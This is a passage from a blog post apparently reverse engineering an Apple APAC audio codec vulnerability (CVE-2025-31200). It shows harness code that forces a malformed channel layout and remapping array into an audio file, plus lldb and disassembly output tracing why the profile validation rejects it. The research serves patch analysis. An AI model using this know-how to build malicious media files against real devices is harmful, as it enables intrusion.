</span></span></span><span><span>6</span><span><span></span>  <span>std</span><span>::</span><span>vector</span><span>&lt;</span><span>char</span><span>&gt;</span> <span>m_RemappingArray</span><span>;</span>           <span>// 0xe0 - 
</span></span></span><span><span>7</span><span><span></span><span>};</span></span></span></code></pre></div><p><code>m_RemappingArray</code> is the actual array that the bits are read into. It’s possible to infer these names from the extensive error logging in the code. Next he has a function to force more elements into the <code>m_RemappingArray</code>.</p>





<div><pre tabindex="0"><code data-lang="c"><span><span>1</span><span><span>void</span> <span>OverrideApac</span><span>(</span><span>CodecConfig</span><span>*</span> <span>config</span><span>)</span> <span>{</span>
</span></span><span><span>2</span><span>  <span>config</span><span>-&gt;</span><span>remappingChannelLayout</span><span>-&gt;</span><span>mChannelLayoutTag</span> <span>=</span> <span>kAudioChannelLayoutTag_HOA_ACN_SN3D</span> <span>|</span> <span>0xffff</span><span>;</span>
</span></span><span><span>3</span><span>  <span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>0x10000</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
</span></span><span><span>4</span><span>    <span>config</span><span>-&gt;</span><span>m_RemappingArray</span><span>.</span><span>push_back</span><span>(</span><span>0xff</span><span>);</span>
</span></span><span><span>5</span><span>  <span>}</span>
</span></span><span><span>6</span><span><span>}</span></span></span></code></pre></div><p>Apple mentions in the Core Audio Types documentation that the <code>channelLayoutTag</code> should be OR’d with the actual number of channels. The first line of the function above tells the deserializer that there are 65,535 channels. AudioToolbox will refuse to produce an audio file with this configuration, so <code>OverrideApac</code> will get called by the lldb hook during serialization.</p>
<p>Then in main we define the basic layout of the audio file:</p>





<div><pre tabindex="0"><code data-lang="objectivec"><span><span> 1</span><span>  <span>AVAudioFormat</span><span>*</span> <span>formatIn</span> <span>=</span> <span>[[</span><span>AVAudioFormat</span> <span>alloc</span><span>]</span> <span>initStandardFormatWithSampleRate</span><span>:</span><span>44100</span>
</span></span><span><span> 2</span><span>                                                                           <span>channels</span><span>:</span><span>1</span><span>];</span>
</span></span><span><span> 3</span><span>  <span>AudioStreamBasicDescription</span> <span>outputDescription</span><span>{.</span><span>mSampleRate</span> <span>=</span> <span>44100</span><span>,</span>
</span></span><span><span> 4</span><span>                                                <span>.</span><span>mFormatID</span> <span>=</span> <span>kAudioFormatAPAC</span><span>,</span>
</span></span><span><span> 5</span><span>                                                <span>.</span><span>mFormatFlags</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span> 6</span><span>                                                <span>.</span><span>mBytesPerPacket</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span> 7</span><span>                                                <span>.</span><span>mFramesPerPacket</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span> 8</span><span>                                                <span>.</span><span>mBytesPerFrame</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span> 9</span><span>                                                <span>.</span><span>mChannelsPerFrame</span> <span>=</span> <span>4</span><span>,</span>
</span></span><span><span>10</span><span>                                                <span>.</span><span>mBitsPerChannel</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span>11</span><span>                                                <span>.</span><span>mReserved</span> <span>=</span> <span>0</span><span>};</span>
</span></span><span><span>12</span><span>  <span>AVAudioChannelLayout</span><span>*</span> <span>channelLayout</span> <span>=</span>
</span></span><span><span>13</span><span>      <span>[</span><span>AVAudioChannelLayout</span> <span>layoutWithLayoutTag</span><span>:</span><span>kAudioChannelLayoutTag_HOA_ACN_SN3D</span> <span>|</span> <span>4</span><span>]</span></span></span></code></pre></div><p>and later write it out:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span> 1</span><span>  <span>AudioBufferList</span> <span>audioBufferList</span><span>{</span>
</span></span><span><span> 2</span><span>      <span>.</span><span>mNumberBuffers</span> <span>=</span> <span>1</span><span>,</span>
</span></span><span><span> 3</span><span>      <span>.</span><span>mBuffers</span> <span>=</span>
</span></span><span><span> 4</span><span>          <span>{</span>
</span></span><span><span> 5</span><span>              <span>{</span>
</span></span><span><span> 6</span><span>                  <span>.</span><span>mNumberChannels</span> <span>=</span> <span>1</span><span>,</span>
</span></span><span><span> 7</span><span>                  <span>.</span><span>mDataByteSize</span> <span>=</span> <span>sizeof</span><span>(</span><span>audioBuffer</span><span>),</span>
</span></span><span><span> 8</span><span>                  <span>.</span><span>mData</span> <span>=</span> <span>audioBuffer</span><span>,</span>
</span></span><span><span> 9</span><span>              <span>},</span>
</span></span><span><span>10</span><span>          <span>},</span>
</span></span><span><span>11</span><span>  <span>};</span>
</span></span><span><span>12</span><span><span>ExtAudioFileWrite</span><span>(</span><span>audioFile</span><span>,</span> <span>sizeof</span><span>(</span><span>audioBuffer</span><span>)</span> <span>/</span> <span>sizeof</span><span>(</span><span>audioBuffer</span><span>[</span><span>0</span><span>]),</span> <span>&amp;</span><span>audioBufferList</span><span>);</span></span></span></code></pre></div><p>What this <em>tries</em> to do is ensure that (2) from above, is true. That is, that the <code>m_RemappingArray</code> has values that are ≥ to the number of total elements required in the array. How is that limit determined though? If we set a breakpoint in lldb right at this block that reads in the size of the <code>m_RemappingArray</code>:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span> 1</span><span><span>if</span> <span>(</span><span>opcode</span> <span>==</span> <span>0x10000</span><span>)</span> <span>{</span>
</span></span><span><span> 2</span><span>	<span>// Get total bits section as before
</span></span></span><span><span> 3</span><span><span></span><span>}</span>
</span></span><span><span> 4</span><span><span>else</span> <span>if</span> <span>(</span><span>opcode</span> <span>!=</span> <span>0</span><span>)</span> <span>{</span>
</span></span><span><span> 5</span><span>    <span>// If opcode is nonzero, use its low 16 bits
</span></span></span><span><span> 6</span><span><span></span>    <span>elementCount</span> <span>=</span> <span>(</span><span>int32_t</span><span>)(</span><span>opcode</span> <span>&amp;</span> <span>0xFFFF</span><span>);</span>
</span></span><span><span> 7</span><span><span>}</span>
</span></span><span><span> 8</span><span><span>else</span> <span>{</span>
</span></span><span><span> 9</span><span>    <span>// Otherwise, fall back to the third array element
</span></span></span><span><span>10</span><span><span></span>    <span>elementCount</span> <span>=</span> <span>(</span><span>int32_t</span><span>)</span><span>section</span><span>[</span><span>2</span><span>];</span>
</span></span><span><span>11</span><span><span>}</span></span></span></code></pre></div><p>and we dump opcode here:</p>





<div><pre tabindex="0"><code data-lang="armasm"><span><span>1</span><span><span>-&gt;</span> cmp    <span>w23</span>, #<span>0x10</span>, <span>lsl</span> #<span>12</span> <span>; Check if w23 is 0x1000
</span></span></span><span><span>2</span><span><span></span><span>(</span>lldb<span>)</span> <span>reg</span> <span>read</span> <span>w23</span>
</span></span><span><span>3</span><span>     w<span>23</span> <span>=</span> <span>0</span><span>x00</span><span>be000d</span></span></span></code></pre></div><p>That 0x00be is <code>kAudioChannelLayoutTag_HOA_ACN_SN3D</code>, and the 0xffff is from the OR that we did during serialization. This is interesting then. Thinking back to the control flow that we want to force in order to test hypothesis (b), we want the parsing logic to read in a value from the stream that is <em>greater</em> than the number of total components. If we dump <code>m_TotalComponents</code> at runtime (offset 0x58 from the base of <code>CodecConfig</code>) we see that with our current encoder it is 1. Therefore, as long as a value is supplied that is greater than 1, then the loop should exit. In the unpatched version it will continue and in the patched version it will hit the new check. I guessed at this point that the values being read in from the stream here would be the 0xFF bytes we forced in the <code>m_RemappingArray</code> from earlier. Stepping through in lldb it turned out that wasn’t the case.</p>
<p>We were reading in 0xffff entries, but they weren’t 0xff each time. This was curious to me. They were &gt; 1 though! So shouldn’t this cause memory cooruption? Even turning on ASan and letting the harness run I didn’t see anything. In both cases (patched and unpatched) it just exits with code 0. Though if you run them in lldb then you can see those error messages from the parser. They were definitely different.</p>
<p>Old:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span>1</span><span> <span>APACProfile</span><span>.</span><span>cpp</span><span>:</span><span>424</span>    <span>ERROR</span><span>:</span> <span>Wrong</span> <span>profile</span> <span>index</span> <span>in</span> <span>GlobalConfig</span>
</span></span><span><span>2</span><span> <span>APACGlobalConfig</span><span>.</span><span>cpp</span><span>:</span><span>894</span>    <span>Profile</span> <span>and</span> <span>level</span> <span>data</span> <span>could</span> <span>not</span> <span>be</span> <span>validated</span></span></span></code></pre></div><p>New:</p>





<div><pre tabindex="0"><code data-lang="c"><span><span>1</span><span><span>error</span>	<span>01</span><span>:</span><span>10</span><span>:</span><span>26.743480</span><span>-</span><span>0400</span>	<span>getaudiolength</span>	<span>&lt;</span><span>private</span><span>&gt;:</span><span>548</span>    <span>Invalid</span> <span>m_RemappingArray</span> <span>bitstream</span> <span>in</span> <span>hoa</span><span>::</span><span>CodecConfig</span><span>::</span><span>Deserialize</span><span>()</span>
</span></span><span><span>2</span><span><span>error</span>	<span>01</span><span>:</span><span>10</span><span>:</span><span>26.743499</span><span>-</span><span>0400</span>	<span>getaudiolength</span>	<span>&lt;</span><span>private</span><span>&gt;:</span><span>860</span>    <span>Error</span> <span>in</span> <span>deserializing</span> <span>ASC</span> <span>components</span></span></span></code></pre></div><p>I even manually checked the bounds of <code>m_RemappingArray</code> in lldb at the instructions that wrote into it to see if it was miraculously being overwritten, and of course, it wasn’t. It did contain exactly 0xffff entries, but no more. This is where I got stuck for a bit. A few things were possible at this stage:</p>
<ol>
<li>This could already be an arbitrary write that ASan wasn’t picking up. There are a number of ways that ASan wouldn’t pickup a small overwrite.</li>
<li>It could be the case that this is close, but some other unknown setup is missing.</li>
</ol>
<p>Since I wouldn’t even be sure where to go about chasing (1), I went for (2).  I thought that a good place to start was taking a look at the error messages from above. Might it be the case that the <code>m_RemappingArray</code> just isn’t being deserialized? By looking for references to “Profile and level data could not be validated” in Binary Ninja, I found that phrase in <code>apac::hoa::GlobalConfig::Deserialize</code>. This is the dispatch site (the callee) of the virtual <code>apac::hoa::CodecConfig::Deserialize</code> method. Error site here:</p>
<p><img alt="Screenshot 2025-05-27 at 6.56.03\u202fPM.png" src="https://blog.benjojo.co.uk/posts/cve-2025-31200/images/finalError.png"/></p>
<p>Before I reverse engineered this monster function, I thought it made sense to actually try and do a <em>little</em> bit to understand what that error could mean in more contextual, audio terms. I found <a href="https://forum.blackmagicdesign.com/viewtopic.php?f=21&amp;t=208361#p1081741">this answer</a> in the Blackmagic Forum website in response to a question about how to mix ambisonics audio when searching for keywords like “ambisonics profile”:</p>
<blockquote>
<p>It seems like the process uses an ambisonic microphone that you place in the center of a custom speaker space and run a test pattern sound through all of the speakers one-by-one to record a “profile” of the location of the speakers. The profile data is then fed into the decoder to let it know where the speakers are in space.</p>
</blockquote>
<p>So this does fit in with our understanding, but it is a fairly general notion. That is, it describes the entire ambisonics <em>profile</em> rather than just one element of it. However, it doesn’t help us much in understanding why our deserialization failed.</p>
<p>After some more fruitless searching I bit the bullet and started to reverse engineer the <code>GlobalConfig</code> method. First of all, we know that we at least make it to the point where there is a call to <code>apac::hoa::CodecConfig::Deserialize</code>. From the backtrace we know that that is at <code>apac::GlobalConfig::Deserialize + 1644</code>. lldb shows a <code>blraa  x8, x17</code> instruction there so we know that this is a virtual method.  If we just follow the control flow up a little bit we see:</p>
<p><img alt="Screenshot 2025-05-27 at 7.25.51\u202fPM.png" src="https://blog.benjojo.co.uk/posts/cve-2025-31200/images/virtCalls.png"/></p>
<p>If you’re wondering about the variable names and symbols here, this was cleaned up by me. I followed along this extremely useful <a href="https://www.seandeaton.com/gotta-re-em-all-reversing-c-virtual-function-tables-with-binary-ninja/">blog post</a> explaining how to reverse engineer complex C++ types in Binary Ninja.  I learned how to tell it about the vtable call to Deserialize at 0x57acc, for example.</p>
<p>Back to the control flow, there is some type flag read in from the stream (what I named <code>codecConfigTypeFromStream</code>) that tells <code>GlobalConfig</code> which constructor to call. Then the instantiated <code>CodecConfig</code> object calls Deserialize. This pattern continues for all the different <code>CodecConfig</code> classes. The vast majority of the code in this function lives under this <code>label_57acc</code>. The way Binary Ninja reconstructed the code here, it essentially showed that if none of these ifs are true, then control flow reaches the “profile and level data” error from above.</p>
<p>There are a number of possible errors <em>inside</em> the block after the label. If any of those error messages are hit then control flow jumps to the “profile and level data” error block only after first failing with a different more specific error.</p>
<p>Searching for the other error: “ERROR: Wrong profile index in GlobalConfig” I found this check:</p>
<p><img alt="Screenshot 2025-05-30 at 7.38.10\u202fPM.png" src="https://blog.benjojo.co.uk/posts/cve-2025-31200/images/inferProfileCallSite.png"/></p>
<p><code>GlobalConfig</code> grabs a reference to the supported profiles: <code>var_b0</code>, as well as some field of <code>GlobalConfig</code>at offset 0x130 and calls <code>apac::ProfileLevelConfig::InferProfileFromCodecConfigs</code>. If that crazy-looking conditional evaluates to true, then the error is logged. The conditional uses the return value of <code>apac::ProfileLevelConfig::InferProfileFromCodecConfigs</code>, <code>x0_43</code>. So I took a look at the function. Binary Ninja interpretted the signature to be:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>uint64_t</span> <span>apac</span><span>::</span><span>ProfileLevelConfig</span><span>::</span><span>InferProfileFromCodecConfigs</span><span>(</span>
</span></span><span><span>2</span><span>	<span>std</span><span>::</span><span>vector</span><span>&lt;</span><span>std</span><span>::</span><span>unique_ptr</span><span>&lt;</span><span>apac</span><span>::</span><span>IASCConfig</span><span>,</span> <span>std</span><span>::</span><span>default_delete</span><span>&lt;</span><span>apac</span><span>::</span><span>IASCConfig</span><span>&gt;</span> <span>&gt;</span> <span>&gt;</span> <span>const</span><span>&amp;</span> <span>arg1</span><span>,</span> 
</span></span><span><span>3</span><span>	<span>apac</span><span>::</span><span>ConstParamArray</span><span>&lt;</span><span>apac</span><span>::</span><span>ProfileLevel</span><span>&gt;</span> <span>const</span><span>&amp;</span> <span>arg2</span><span>)</span></span></span></code></pre></div><p>There are two arguments:</p>
<ul>
<li><code>arg1</code>: A const reference to a vector of unique pointers to <code>IASCConfig</code> objects</li>
<li><code>arg2</code>: A const reference to a <code>ConstParamArray</code> of <code>ProfileLevel</code> objects</li>
</ul>
<h2 id="understanding-the-error">Understanding the Error</h2>
<p>The function itself is quite short and has a lot of symbols still in it, so I took a crack at reverse engineering it. The first major clue was the outer loop structure:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>for</span> <span>(</span><span>int64_t</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>!=</span> <span>0x78</span><span>;</span> <span>i</span> <span>+=</span> <span>0x28</span><span>)</span></span></span></code></pre></div><p>This told me we’re dealing with three iterations (0x78 / 0x28 = 3), with each iteration stepping by 40 bytes. This suggested an array of three structures, each 40 bytes long. Combined with the function name <code>InferProfileFromCodecConfigs</code>, I guessed that this pointed to three different ‘audio profile configurations.’ The fact that this step size is used to index into multiple global arrays (<code>&amp;apac::kProfileConfigs + i</code>, <code>i + &amp;data_8ec838</code>, etc.) confirmed these are parallel arrays because they were indexed by the same offset.</p>
<p>The very first lines inside the loop revealed the <code>ConstParamArray</code> layout:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>int16_t</span><span>*</span> <span>x8_1</span> <span>=</span> <span>*</span><span>(</span><span>uint64_t</span><span>*</span><span>)</span><span>arg2</span><span>;</span>        <span>// Offset +0 (Start)
</span></span></span><span><span>2</span><span><span></span><span>int64_t</span> <span>x9_1</span> <span>=</span> <span>*</span><span>(</span><span>uint64_t</span><span>*</span><span>)((</span><span>char</span><span>*</span><span>)</span><span>arg2</span> <span>+</span> <span>8</span><span>);</span>  <span>// Offset +8 (End)
</span></span></span></code></pre></div><p>This is the classic C++ iterator pattern—a begin/end pointer pair. The <code>ConstParamArray&lt;ProfileLevel&gt;</code> is clearly just:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>struct</span> <span>ConstParamArray</span> <span>{</span>
</span></span><span><span>2</span><span>    <span>const</span> <span>ProfileLevel</span><span>*</span> <span>begin</span><span>;</span>  <span>// +0
</span></span></span><span><span>3</span><span><span></span>    <span>const</span> <span>ProfileLevel</span><span>*</span> <span>end</span><span>;</span>    <span>// +8  
</span></span></span><span><span>4</span><span><span></span><span>};</span></span></span></code></pre></div><p>The <code>int16_t*</code> cast suggests <code>ProfileLevel</code> contains 16-bit values, and the loop that follows confirms this:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>while</span> <span>(</span><span>/* condition */</span><span>)</span> <span>{</span>
</span></span><span><span>2</span><span>    <span>x8_1</span> <span>=</span> <span>&amp;</span><span>x8_1</span><span>[</span><span>2</span><span>];</span>  <span>// Advance by 2 int16_t values
</span></span></span><span><span>3</span><span><span></span>    <span>if</span> <span>(</span><span>x8_1</span> <span>==</span> <span>x9_1</span><span>)</span> <span>break</span><span>;</span>
</span></span><span><span>4</span><span><span>}</span></span></span></code></pre></div><p>This <code>&amp;x8_1[2]</code> advancement pattern hinted that <code>ProfileLevel</code> is 4 bytes (2 × 16-bit values):</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>struct</span> <span>ProfileLevel</span> <span>{</span>
</span></span><span><span>2</span><span>    <span>uint16_t</span> <span>profile</span><span>;</span>
</span></span><span><span>3</span><span>    <span>uint16_t</span> <span>level</span><span>;</span> 
</span></span><span><span>4</span><span><span>};</span></span></span></code></pre></div><p>Next there were these virtual method calls:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>int64_t</span><span>*</span> <span>x26_1</span> <span>=</span> <span>*</span><span>(</span><span>uint64_t</span><span>*</span><span>)</span><span>arg1</span><span>;</span> <span>// x26_1 = IASCConfig
</span></span></span><span><span>2</span><span><span>// Continues
</span></span></span><span><span>3</span><span><span></span><span>*</span><span>(</span><span>uint64_t</span><span>*</span><span>)(</span><span>*</span><span>(</span><span>uint64_t</span><span>*</span><span>)(</span><span>**</span><span>(</span><span>uint64_t</span><span>**</span><span>)</span><span>x26_1</span> <span>+</span> <span>0x28</span><span>))()</span> 
</span></span><span><span>4</span><span><span>*</span><span>(</span><span>uint64_t</span><span>*</span><span>)(</span><span>*</span><span>(</span><span>uint64_t</span><span>*</span><span>)(</span><span>**</span><span>(</span><span>uint64_t</span><span>**</span><span>)</span><span>x26_1</span> <span>+</span> <span>0x30</span><span>))()</span></span></span></code></pre></div><p>This is a standard C++ virtual function call pattern: <code>object-&gt;vtable[offset]()</code>. The double dereference <code>**(uint64_t**)x26_1</code> gets us to the vtable, then we index into it at offsets <code>+0x28</code> and <code>+0x30</code>. Earlier in the code, there’s also a simpler access pattern:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>*</span><span>(</span><span>uint32_t</span><span>*</span><span>)(</span><span>*</span><span>(</span><span>uint64_t</span><span>*</span><span>)</span><span>x26_1</span> <span>+</span> <span>8</span><span>)</span></span></span></code></pre></div><p>This suggests a data member access at offset +8 in the object, not a virtual call. So the <code>IASCConfig</code> structure likely looks like:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>struct</span> <span>IASCConfig</span> <span>{</span>
</span></span><span><span>2</span><span>    <span>void</span><span>*</span> <span>vtable</span><span>;</span>           <span>// +0
</span></span></span><span><span>3</span><span><span></span>    <span>uint32_t</span> <span>codec_type</span><span>;</span>    <span>// +8 (accessed directly)
</span></span></span><span><span>4</span><span><span></span>    <span>// Any other members
</span></span></span><span><span>5</span><span><span></span><span>};</span></span></span></code></pre></div><p>With virtual functions at vtable offsets <code>+0x28</code> and <code>+0x30.</code> The return statements were also revealing:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>return</span> <span>(</span><span>uint64_t</span><span>)</span><span>*</span><span>(</span><span>uint16_t</span><span>*</span><span>)(</span><span>&amp;</span><span>apac</span><span>::</span><span>kProfileConfigs</span> <span>+</span> <span>i</span><span>)</span> <span>|</span> <span>x25_1</span> <span>&lt;&lt;</span> <span>0x10</span><span>;</span></span></span></code></pre></div><p>This showed that:</p>
<ol>
<li>The ‘profile ID’ is stored as the first 16-bit value in each <code>ProfileConfig</code> entry</li>
<li>The ‘level’ (<code>x25_1</code>) gets shifted left by 16 bits</li>
<li>The result is packed as <code>profile | (level &lt;&lt; 16)</code></li>
</ol>
<p>Then there was a fairly cryptic bit manipulation sequence:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span> 1</span><span><span>if</span> <span>(</span><span>!</span><span>(</span><span>x12_3</span> <span>&amp;</span> <span>0xffff</span><span>))</span>
</span></span><span><span> 2</span><span>    <span>z_1</span> <span>=</span> <span>x12_3</span> <span>==</span> <span>0xffff0000</span><span>;</span>
</span></span><span><span> 3</span><span><span>else</span>  
</span></span><span><span> 4</span><span>    <span>z_1</span> <span>=</span> <span>true</span><span>;</span>
</span></span><span><span> 5</span><span>
</span></span><span><span> 6</span><span><span>if</span> <span>(</span><span>!</span><span>z_1</span><span>)</span>
</span></span><span><span> 7</span><span>    <span>z_2</span> <span>=</span> <span>!</span><span>(</span><span>x12_3</span> <span>&amp;</span> <span>0xfffeffff</span><span>);</span>
</span></span><span><span> 8</span><span><span>else</span>
</span></span><span><span> 9</span><span>    <span>z_2</span> <span>=</span> <span>true</span><span>;</span>
</span></span><span><span>10</span><span>
</span></span><span><span>11</span><span><span>if</span> <span>(</span><span>!</span><span>z_2</span><span>)</span>
</span></span><span><span>12</span><span>    <span>x13_2</span> <span>=</span> <span>x10_4</span> <span>&amp;</span> <span>0xffff0000</span><span>;</span>  
</span></span><span><span>13</span><span><span>else</span>
</span></span><span><span>14</span><span>    <span>x13_2</span> <span>=</span> <span>x10_4</span><span>;</span>               
</span></span></code></pre></div><p>This revealed some kind of matching system where:</p>
<ul>
<li>Some requirements are wildcards (<code>0xffff0000</code>)</li>
<li>Some match only the upper 16 bits</li>
<li>Others require exact matches</li>
<li>The capability values are structured as 32-bit words with different significance for upper/lower 16 bits</li>
</ul>
<p>Throughout the function, the same offset <code>i</code> is used to index into multiple global arrays:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>&amp;</span><span>apac</span><span>::</span><span>kProfileConfigs</span> <span>+</span> <span>i</span>           <span>// Profile configurations
</span></span></span><span><span>2</span><span><span></span><span>i</span> <span>+</span> <span>&amp;</span><span>data_8ec838</span>                     <span>// Level config start pointers  
</span></span></span><span><span>3</span><span><span></span><span>i</span> <span>+</span> <span>&amp;</span><span>data_8ec840</span>                     <span>// Level config end pointers
</span></span></span><span><span>4</span><span><span></span><span>i</span> <span>+</span> <span>&amp;</span><span>data_8ec848</span>                     <span>// Capability requirement start
</span></span></span><span><span>5</span><span><span></span><span>i</span> <span>+</span> <span>&amp;</span><span>data_8ec850</span>                     <span>// Capability requirement end
</span></span></span></code></pre></div><p>Looking back at the callsite the most revealing part is how the return value is checked:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>if</span> <span>(</span><span>!</span><span>(</span><span>0xffff</span> <span>&amp;</span> <span>~</span><span>x0_43</span><span>)</span> <span>||</span> <span>x0_44</span> <span>&gt;</span> <span>0x1f</span> <span>||</span> <span>(</span><span>x0_43</span> <span>&amp;</span> <span>0xffff</span><span>)</span> <span>&gt;</span> <span>0x1f</span>
</span></span><span><span>2</span><span>    <span>||</span> <span>x0_44</span> <span>&gt;</span> <span>(</span><span>uint32_t</span><span>)(</span><span>uint16_t</span><span>)</span><span>x0_43</span><span>)</span>
</span></span><span><span>3</span><span><span>{</span>
</span></span><span><span>4</span><span>    <span>// ERROR: Wrong profile index in GlobalConfig
</span></span></span><span><span>5</span><span><span></span><span>}</span></span></span></code></pre></div><p>The condition <code>!(0xffff &amp; ~x0_43)</code> is true when <code>(x0_43 &amp; 0xffff) == 0xffff</code> - meaning the function returned the failure value <code>0xffff</code>. But more interestingly, it shows that <strong>profile IDs must be ≤ 31</strong> (<code>&gt; 0x1f</code> triggers an error). This suggests support for up to 32 different audio profiles.</p>
<p>In lldb I dumped the entire <code>profileLevel</code> array:</p>





<pre tabindex="0"><code>(lldb) p/x *(uint64_t*)($x1)
(uint64_t) 0x000000010073a59c
(lldb) p/x *(uint64_t*)($x1+0x8)
(uint64_t) 0x000000010073a61c

(lldb) x/32x 0x000000010073a59c
0x10073a59c: 0x00000000 0x000f0001 0x000f0002 0x000f0003
0x10073a5ac: 0x000f0004 0x00020005 0x000f0006 0x000f0007
...
0x10073a60c: 0x000f001c 0x000f001d 0x000f001e 0x0006001f</code></pre><p>Interpreting these as <code>ProfileLevel</code> pairs (profile in low 16 bits, level in high 16 bits):</p>
<ul>
<li><code>0x00000000</code> = Profile 0, Level 0</li>
<li><code>0x000f0001</code> = Profile 1, Level 15</li>
<li><code>0x000f0002</code> = Profile 2, Level 15</li>
<li><code>0x00020005</code> = Profile 5, Level 2</li>
<li><code>0x0006001f</code> = Profile 31, Level 6</li>
</ul>
<p>Most profiles support level 15, but profile 5 only supports level 2, and profile 31 only supports level 6, for example.  Another check in the error condition is:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>x0_44</span> <span>&gt;</span> <span>(</span><span>uint32_t</span><span>)(</span><span>uint16_t</span><span>)</span><span>x0_43</span></span></span></code></pre></div><p>Where <code>x0_44</code> comes from <code>*(uint16_t*)((char*)arg1 + 0x20)</code> - this appears to be the <strong>currently configured profile</strong> from the <code>GlobalConfig</code> object.</p>
<p>So the check is: “current_profile &gt; inferred_profile”. This suggests the function is trying to find a profile that’s <strong>at least as capable</strong> as what’s currently configured. If it can only find a “lower” profile, that’s an error condition.</p>
<p>With this understanding of the error conditions, I initially suspected the issue was simply an <strong>empty codec configurations vector</strong>. The logic seemed straightforward: if no codecs are configured, the function should default to the basic profile. But when I stepped through the actual execution in lldb and got to to the point where the function checks the size of the vector, I found that it actually contained one 8-byte entry:</p>





<pre tabindex="0"><code>(lldb) reg read x26 x27
     x26 = 0x0000600000310190  # begin
     x27 = 0x0000600000310198  # end</code></pre><p>Examining the codec configuration entry:</p>





<pre tabindex="0"><code>(lldb) x/2gx 0x0000600002ba0290
0x600002ba0290: 0x0000000158604b70 0x0000000000000000</code></pre><p>This contained a pointer to an actual <code>CodecConfig</code> object. Following that pointer revealed:</p>





<pre tabindex="0"><code>m read 0x0000000158604b70 --format A
0x158604b70: 0x0000000100a37640 AudioCodecs`vtable for apac::hoa::CodecConfig + 16</code></pre><p>The vtable pointed to <code>apac::hoa::CodecConfig</code>.</p>
<p>Stepping through the profile matching logic, I found that:</p>
<ul>
<li>Profile 31 <strong>does support</strong> HOA codec ID 2</li>
<li>The level validation <strong>passed</strong> (level 6 requirements met)</li>
<li>But validation <strong>failed</strong> during a later check</li>
</ul>
<p>The function made two virtual method calls on the codec object:</p>





<div><pre tabindex="0"><code data-lang="armasm"><span><span>1</span><span><span>; First call: GetNumChannels()
</span></span></span><span><span>2</span><span><span></span>ldr    <span>x8</span>, <span>[</span><span>x16</span>, #<span>0x28</span><span>]!</span>
</span></span><span><span>3</span><span>blraa  <span>x8</span>, <span>x17</span>              <span>; Returns channel count
</span></span></span><span><span>4</span><span><span></span>cmp    <span>w23</span>, <span>w0</span>              <span>; Compare with level requirement
</span></span></span><span><span>5</span><span><span></span>
</span></span><span><span>6</span><span><span>; Second call: GetChannelLayout()  
</span></span></span><span><span>7</span><span><span></span>ldr    <span>x8</span>, <span>[</span><span>x16</span>, #<span>0x30</span><span>]!</span>
</span></span><span><span>8</span><span>blraa  <span>x8</span>, <span>x17</span>              <span>; Returns channel layout tag
</span></span></span></code></pre></div><p>Through lldb, I could see the<code>apac::hoa::CodecConfig::GetNumChannels()</code> → returned 0xffff. I didn’t yet see <code>GetChannelLayout</code> being executed. It then hit this check where the number of channels was compared against presumably the maximum:</p>





<div><pre tabindex="0"><code data-lang="armasm"><span><span>1</span><span>cmp    <span>w23</span>, <span>w0</span>
</span></span><span><span>2</span><span>b<span>.lo</span>   <span>0</span><span>x10</span><span>0350e98</span></span></span></code></pre></div><p>w23 here was 0x79. So this check failed and the function returned.  It was instantly failing because of the way we were overriding the channel layout tag (with a huge <code>numChannels</code>):</p>





<div><pre tabindex="0"><code data-lang="c++"><span><span>1</span><span><span>config</span><span>-&gt;</span><span>remappingChannelLayout</span><span>-&gt;</span><span>mChannelLayoutTag</span> <span>=</span> 
</span></span><span><span>2</span><span>	<span>kAudioChannelLayoutTag_HOA_ACN_SN3D</span> <span>|</span> <span>0xffff</span><span>;</span></span></span></code></pre></div><p>So I went back and set it to a more reasonable channel layout tag. I tried setting the channel count to 0x78:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>config</span><span>-&gt;</span><span>remappingChannelLayout</span><span>-&gt;</span><span>mChannelLayoutTag</span> <span>=</span> 
</span></span><span><span>2</span><span>	<span>kAudioChannelLayoutTag_HOA_ACN_SN3D</span> <span>|</span> <span>0x78</span><span>;</span></span></span></code></pre></div><p>This time, <code>GetNumChannels()</code> returned 0x78, which passed the channel count check (0x78 &lt; 0x79). The function progressed to the next validation stage and made a vtable call to <code>GetChannelLayout().</code></p>
<p>The function loaded two pointers defining the supported ACL (Audio Channel Layout) tags for the profile:</p>





<pre tabindex="0"><code>(lldb) reg read x8 x9
x8 = 0x000000010073a61c  AudioCodecs`apac::main_profile::kSupportedACLTags
x9 = 0x000000010073a6bc  AudioCodecs`apac::low_profile::kSupportedACLTags</code></pre><p>It then entered a loop comparing my channel layout tag against each supported tag:</p>





<div><pre tabindex="0"><code data-lang="armasm"><span><span>1</span><span>ldr    <span>w10</span>, <span>[</span><span>x0</span><span>]</span>           <span>; Load codec&#39;s channel layout tag
</span></span></span><span><span>2</span><span><span></span>and    <span>w11</span>, <span>w10</span>, #<span>0xffff0000</span>  <span>; Extract format bits
</span></span></span><span><span>3</span><span><span></span>ldr    <span>w12</span>, <span>[</span><span>x8</span><span>]</span>           <span>; Load supported tag from list
